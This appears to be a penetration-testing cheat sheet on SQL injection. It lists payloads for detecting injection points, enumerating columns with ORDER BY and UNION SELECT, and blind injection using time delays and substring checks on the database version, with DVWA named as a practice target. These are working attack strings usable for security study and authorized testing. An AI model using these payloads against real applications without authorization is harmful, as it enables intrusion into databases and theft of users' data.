## SQL Injection

### Manual Testing 
```bash
'                       # a single quote, treated as a string terminator
;                       # a semi-colon, treated as a query terminator
#                       # a comment, comments out anything that comes after that character in that line
-- -                    # a comment, same as above
/**/                    # a comment, starts with /* , ends with */ , and can contain anything in between 
AND 1=1                 # an and statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
OR 1=1                  # an or statement, 1=1 tests for true condition, use 1=2 to test for false condition
sleep(5)                # delays the response by the number of seconds mentioned in the sleep command. 

We should combine the terminators and comment characters above.

'                       # a single quote only to see any error, because of string termination  
';                      # a single quote and semi-colon to see any error, because of query termination
';-- -                  # a single quote and semi-colon and comment after the character to see if this succeeds. 
AND 1 = 1               # and statement to see any error or success 
OR 1 = 1                # or statement to see any error or success
' AND 1=1;-- -          # adding and condition to see if this succeeds.  
' OR 1=1; -- -          # adding or condition to see if this succeeds. 
1 and sleep(5)          # adding and operator, sleep command to look at the time to get the response back
1' and sleep(5);-- -    # adding and operator, sleep command plus string terminator, query terminator, and comment
```

### Exploitation 
```bash

1 order by 1
1 order by 1,2
1 order by 1,2,3
... (Until you see some column error)

' order by 1-- -
' order by 1,2-- -
' order by 1,2,3-- -
...(Until you see some column error)

' order by 1;-- -
' order by 1,2;-- -
' order by 1,2,3;-- -
...(Until you see some column error)

UNION SELECT 1,2-- -
UNION SELECT 1,2;-- -

## Blind SQL Injection

```bash
# Try the following characters. This query does not show anything or 
'       
"
; 

# Supporse that SQL statement would looks like this. 
# $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; 
# Try the following query, You should see results showing all data.  
' or '1'='1    
' or 1=1 # 
' or 1=1 -- -

# Try the following query, but will not show anything 
' AND 1=1 #      
' AND 1=1 -- - 

# Try the following query instead, since you will need some successful query 
<value>' AND 1=1 #
<value>' AND 1=1 -- -

1' AND 1=1 #
1' AND 1=1 -- -

You should see the successful query and response back. 

If you see the query successful, try the following. 

# This will tell you the version number of database with the successful query
# We use substring(string, position, length) function

# Check database version number
1' and substring(@@version,1,1)=4-- -
1' and substring(@@version,1,1)=5-- -
...

# Check database name
# Use wfuzz and test with DVWA - Assume that the number of characters for database is less than 10.
